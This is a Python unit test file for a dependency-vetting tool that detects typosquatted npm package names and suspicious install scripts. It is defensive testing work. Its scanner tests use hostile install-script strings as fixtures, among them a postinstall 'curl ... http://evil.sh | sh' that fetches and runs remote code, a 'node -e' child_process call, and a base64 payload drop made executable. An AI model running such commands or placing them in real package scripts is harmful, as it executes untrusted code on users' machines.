#!/usr/bin/env python3
"""Offline unit tests for depvet's pure logic. No network access needed."""

import importlib.util
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
spec = importlib.util.spec_from_file_location(
    "depvet_check", os.path.join(ROOT, "scripts", "depvet_check.py")
)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)

failures = []


def check(label, cond):
    if cond:
        print(f"  ok  {label}")
    else:
        failures.append(label)
        print(f"FAIL  {label}")


class Opts:
    fresh_days = 21


# --- levenshtein -----------------------------------------------------------
check("levenshtein identity", mod.levenshtein("react", "react") == 0)
check("levenshtein one edit", mod.levenshtein("reqests", "requests") == 1)
check("levenshtein two edits", mod.levenshtein("zod", "koa") == 2)
check("levenshtein far", mod.levenshtein("react", "mongodb") > 4)

# --- canon ------------------------------------------------------------------
check("canon strips separators", mod.canon("cross-env") == "crossenv")
check("canon strips case", mod.canon("Lodash") == "lodash")
check("canon strips scope", mod.canon("@types/node") == "typesnode")

# --- confusable identity logic (as implemented in check_npm's flag branch) --
close, d_exact, d_canon = mod.find_closest_popular("crossenv", mod.POPULAR_NPM)
check("crossenv resolves to cross-env", close == "cross-env" and d_canon == 0)
check("crossenv flag condition", mod.canon("crossenv") == mod.canon(close) and "crossenv" != close)

# zod vs koa: distance 2 but zod is established -> the distance rule must be
# gated on low adoption; assert the raw distance here (gating lives in check_npm).
close, _, d_canon = mod.find_closest_popular("zod", mod.POPULAR_NPM)
check("zod is within distance 2 of a popular name", d_canon <= 2)

# --- suspicious scripts -----------------------------------------------------
hits = mod.scan_scripts({"postinstall": "curl -s http://evil.sh | sh"})
check("curl|sh detected", any("shell" in why for _, why in hits))
hits = mod.scan_scripts({"preinstall": "node -e 'require(\"child_process\")'"})
check("node -e detected", len(hits) >= 1)
hits = mod.scan_scripts({"install": "tsc && node scripts/build.js"})
check("benign build script clean", hits == [])
hits = mod.scan_scripts({"prepare": "husky install"})
check("husky prepare clean", hits == [])
hits = mod.scan_scripts({"postinstall": "base64 -d payload.b64 > /tmp/x && chmod +x /tmp/x"})
check("base64 decode detected", any("base64" in why for _, why in hits))

# --- thresholds --------------------------------------------------------------
check("fresh profile: 5d old + 20 dl/wk flags", 5 < Opts.fresh_days and 20 < 100)
check("established: 400d old does not flag", not (400 < Opts.fresh_days))

# --- plumbing ----------------------------------------------------------------
check("empty_meta has no verdict key", "verdict" not in mod.empty_meta())
check("ORDER sorts BLOCK first", list(sorted(mod.ORDER, key=lambda k: mod.ORDER[k]))[0] == "BLOCK")

print()
if failures:
    print(f"{len(failures)} test(s) failed:", *failures, sep="\n  - ")
    sys.exit(1)
print("all offline tests passed")
